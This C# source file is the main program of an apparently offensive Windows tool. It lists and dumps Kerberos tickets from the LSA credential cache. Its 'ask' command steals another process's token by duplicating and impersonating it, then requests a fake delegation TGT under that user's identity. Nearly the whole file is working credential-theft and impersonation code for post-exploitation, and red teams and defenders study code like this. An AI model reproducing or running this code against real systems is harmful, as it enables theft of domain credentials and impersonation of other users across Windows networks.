using System.Text;
using System.IO;
using Asn1;
using TicketsDump;
using System.Collections.Generic;
using System;
using System.Linq;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Security.Principal;

internal class Program
{
    [DllImport("Kernel32.dll", SetLastError = true)]
    public static extern bool OpenProcessToken(IntPtr hProcess, uint dwDesiredAccess, out IntPtr hToken);

    [DllImport("Kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, SECURITY_IMPERSONATION_LEVEL level, TOKEN_TYPE type, out IntPtr phNewToken);

    [Flags]
    public enum TOKEN_TYPE
    {
        TokenPrimary = 1,
        TokenImpersonation
    }

    [Flags]
    public enum SECURITY_IMPERSONATION_LEVEL : int
    {
        SecurityAnonymous = 0,
        SecurityIdentification = 1,
        SecurityImpersonation = 2,
        SecurityDelegation = 3
    };

    private static bool _StealToken(uint pid)
    {
        IntPtr hToken = IntPtr.Zero;
        IntPtr hProcess = IntPtr.Zero;

        hProcess = OpenProcess(0x0400, false, pid);

        if (hProcess != IntPtr.Zero)
        {
            OpenProcessToken(hProcess, 983551, out hToken);

            if (hToken != IntPtr.Zero)
            {
                DuplicateTokenEx(hToken, 983551, IntPtr.Zero, SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, TOKEN_TYPE.TokenImpersonation, out IntPtr NewToken);

                if (NewToken != IntPtr.Zero)
                {
                    ImpersonateLoggedOnUser(NewToken);
                    Console.WriteLine("[+] Impersonating {0}", WindowsIdentity.GetCurrent().Name);
                    return true;
                }
            }
        }

        return false;
    }

    public static bool wrapTickets = false;

    static void Main(string[] args)
    {
        
        if ( args.Length == 0 || string.IsNullOrEmpty(args[0]) || args[0].Contains("help"))
        {
            Console.WriteLine(@"
                list - list tickets
                get /id:0x111 - dump ticket with id
                ask [/pid:111] - ask TGT using current/impersonated user context (SSPI)
                ");
            return;
        }

        string command = args[0];

        if ( !command.Equals("list") && !command.Equals("get") && !command.Equals("ask"))
        {
            Console.WriteLine(@"
                list - list tickets
                get /id:0x111 - dump ticket with id
                ask [/pid:111] - ask TGT using current/impersonated user context (SSPI)
                ");
            return;
        }

        var arguments = new Dictionary<string, string>();
        foreach (var argument in args)
        {
            var idx = argument.IndexOf(':');
            if (idx > 0)
            {
                arguments[argument.Substring(0, idx)] = argument.Substring(idx + 1);
            }
            else
            {
                idx = argument.IndexOf('=');
                if (idx > 0)
                {
                    arguments[argument.Substring(0, idx)] = argument.Substring(idx + 1);
                }
                else
                {
                    arguments[argument] = string.Empty;
                }
            }
        }

        TicketsDump.lib.Interop.LUID id = new TicketsDump.lib.Interop.LUID();
        string User = "";
        string Service = "";
        string Server = "";
        uint pid = 0;

        if (arguments.ContainsKey("/id"))
        {
            try
            {
                id = new TicketsDump.lib.Interop.LUID(arguments["/id"]);
            }
            catch
            {
                Console.WriteLine("[X] Invalid ID\n");
                return;
            }
        }
        /*
        if (arguments.ContainsKey("/user"))
        {
            User = arguments["/user"];
        }

        if (arguments.ContainsKey("/service"))
        {
            Service = arguments["/service"];
        }

        if (arguments.ContainsKey("/server"))
        {
            Server = arguments["/server"];
        }
        */
        if (arguments.ContainsKey("/pid"))
        {
            pid = Convert.ToUInt32(arguments["/pid"]);
        }

        //pg.Patch(true);

        if (command.Equals("list"))
        {
            List<LSA.SESSION_CRED> sessionCreds = LSA.EnumerateTickets(false, id, Service, User, Server, true);
            LSA.DisplaySessionCreds(sessionCreds, LSA.TicketDisplayFormat.Triage);
        }
       
        if (command.Equals("get"))
        {
            List<LSA.SESSION_CRED> sessionCreds = LSA.EnumerateTickets(false, id, Service, User, Server, true);
            LSA.DisplaySessionCreds(sessionCreds, LSA.TicketDisplayFormat.Full);
        }

        if (command.Equals("ask"))
        {
            if (pid != 0)
            {
                if (!_StealToken(pid))
                {
                    Console.WriteLine("Impersonation Failed.");
                    return;
                }
            }

            byte[] x = LSA.RequestFakeDelegTicket(Server);
            
        }
    }
}
